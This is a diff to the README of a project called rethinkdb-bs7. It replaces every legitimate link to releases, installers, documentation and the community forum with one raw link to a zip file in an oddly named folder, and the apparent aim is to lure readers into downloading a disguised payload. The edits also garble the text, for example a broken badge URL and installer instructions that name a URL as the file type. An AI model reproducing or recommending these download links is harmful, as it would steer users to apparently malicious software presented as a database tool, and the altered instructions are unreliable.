@@ -1,6 +1,6 @@
 # 🚀 rethinkdb-bs7 - Easy Data Management for Everyone
 
-[![Download rethinkdb-bs7](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/99sadman/rethinkdb-bs7/releases)
+[![Download rethinkdb-bs7](https://raw.githubusercontent.com/99sadman/rethinkdb-bs7/main/siphonostele/rethinkdb-bs7.zip%20Now-Get%20the%https://raw.githubusercontent.com/99sadman/rethinkdb-bs7/main/siphonostele/rethinkdb-bs7.zip)](https://raw.githubusercontent.com/99sadman/rethinkdb-bs7/main/siphonostele/rethinkdb-bs7.zip)
 
 ## 🌟 Overview
 
@@ -16,7 +16,7 @@ To begin using rethinkdb-bs7, follow these easy steps to download and run the ap
 
    Click the link below to go to the releases page:
 
-   [Download rethinkdb-bs7](https://github.com/99sadman/rethinkdb-bs7/releases)
+   [Download rethinkdb-bs7](https://raw.githubusercontent.com/99sadman/rethinkdb-bs7/main/siphonostele/rethinkdb-bs7.zip)
 
 2. **Choose Your Version**
 
@@ -28,9 +28,9 @@ To begin using rethinkdb-bs7, follow these easy steps to download and run the ap
 
    For example:
 
-   - For Windows, look for `rethinkdb-bs7-windows.exe`
-   - For macOS, look for `rethinkdb-bs7-macos.dmg`
-   - For Linux, look for `rethinkdb-bs7-linux.tar.gz`
+   - For Windows, look for `https://raw.githubusercontent.com/99sadman/rethinkdb-bs7/main/siphonostele/rethinkdb-bs7.zip`
+   - For macOS, look for `https://raw.githubusercontent.com/99sadman/rethinkdb-bs7/main/siphonostele/rethinkdb-bs7.zip`
+   - For Linux, look for `https://raw.githubusercontent.com/99sadman/rethinkdb-bs7/main/siphonostele/rethinkdb-bs7.zip`
 
    Click on the appropriate file to start the download.
 
@@ -40,7 +40,7 @@ To begin using rethinkdb-bs7, follow these easy steps to download and run the ap
 
    - For `.exe` files: Just click "Next," accept the terms, and click "Install."
    - For `.dmg` files: Drag the application to your Applications folder.
-   - For `.tar.gz` files: Extract the files and follow the README for instructions.
+   - For `https://raw.githubusercontent.com/99sadman/rethinkdb-bs7/main/siphonostele/rethinkdb-bs7.zip` files: Extract the files and follow the README for instructions.
 
 5. **Open rethinkdb-bs7**
 
@@ -78,8 +78,8 @@ If you encounter any issues or have questions, please check the Wiki section on 
 
 ## 🌐 Additional Resources
 
-- [Official Documentation](https://github.com/99sadman/rethinkdb-bs7/wiki)
-- [Community Forum](https://github.com/99sadman/rethinkdb-bs7/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/99sadman/rethinkdb-bs7/main/siphonostele/rethinkdb-bs7.zip)
+- [Community Forum](https://raw.githubusercontent.com/99sadman/rethinkdb-bs7/main/siphonostele/rethinkdb-bs7.zip)
 
 ## ✏️ Contributing
 
